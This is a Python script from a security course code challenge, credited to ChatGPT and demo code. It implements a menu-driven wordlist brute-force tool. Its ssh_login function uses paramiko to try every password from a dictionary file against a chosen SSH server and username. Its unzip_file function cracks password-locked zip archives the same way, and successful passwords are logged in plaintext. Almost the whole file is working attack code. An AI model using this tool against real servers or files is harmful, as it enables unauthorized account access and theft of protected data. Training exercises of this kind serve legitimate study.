# Ops401 Day 26 Code-Challenge 
# Justin 'Sage' 
# Made with ChatGPT and demo code

import logging
import time
import paramiko
import zipfile

# Create and configure logger
logging.basicConfig(filename="newfile.log", format='%(asctime)s %(message)s', filemode='w')
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

# Declare functions
def iterator():
    filepath = input("Enter your dictionary filepath:\n")
    logger.debug(f"Iterator function called with filepath: {filepath}")

    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.rstrip()
            print(word)
            time.sleep(1)

def check_password():
    target = input("Enter the password you want to search for:\n")
    filepath = input("Enter your dictionary filepath:\n")
    logger.debug(f"check_password function called with target: {target}, filepath: {filepath}")

    found = False
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.rstrip()
            if word == target:
                found = True
                break
    
    if found:
        print("The password was found in the word list.")
        logger.info("The password was found in the word list.")
    else:
        print("The password was not found in the word list.")
        logger.info("The password was not found in the word list.")

def ssh_login():
    ip = input("Enter the IP address of the SSH server:\n")
    username = input("Enter the username:\n")
    filepath = input("Enter your dictionary filepath:\n")
    logger.debug(f"ssh_login function called with ip: {ip}, username: {username}, filepath: {filepath}")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            password = line.rstrip()
            try:
                ssh.connect(ip, username=username, password=password, timeout=5)
                print(f"Successful login with password: {password}")
                logger.info(f"Successful login with password: {password}")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print(f"Failed login with password: {password}")
                logger.warning(f"Failed login with password: {password}")
            except Exception as e:
                print(f"Error occurred: {e}")
                logger.error(f"Error occurred: {e}")
                break

def unzip_file():
    zip_filepath = input("Enter the filepath of the password-locked zip file:\n")
    filepath = input("Enter your dictionary filepath:\n")
    logger.debug(f"unzip_file function called with zip_filepath: {zip_filepath}, filepath: {filepath}")

    with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
        with open(filepath, encoding="ISO-8859-1") as file:
            for line in file:
                password = line.rstrip()
                try:
                    zip_ref.extractall(pwd=password.encode('cp850', 'replace'))
                    print(f"Successfully extracted the zip file with password: {password}")
                    logger.info(f"Successfully extracted the zip file with password: {password}")
                    break
                except RuntimeError:
                    print(f"Failed to extract the zip file with password: {password}")
                    logger.warning(f"Failed to extract the zip file with password: {password}")

# Main
if __name__ == "__main__":
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - SSH Login
4 - Unzip Password-Protected File
5 - Exit
Please enter a number: 
""")
        if mode == "1":
            iterator()
        elif mode == "2":
            check_password()
        elif mode == "3":
            ssh_login()
        elif mode == "4":
            unzip_file()
        elif mode == '5':
            break
        else:
            print("Invalid selection...")
            logger.warning("Invalid selection...")
